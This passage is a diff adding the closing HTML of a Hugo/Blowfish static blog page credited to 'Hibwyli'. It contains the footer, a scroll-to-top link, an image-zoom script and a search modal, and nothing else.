+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
+            title="">
+            
+            tags
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
+            title="">
+            
+            categories
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      Copyright © Hibwyli
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
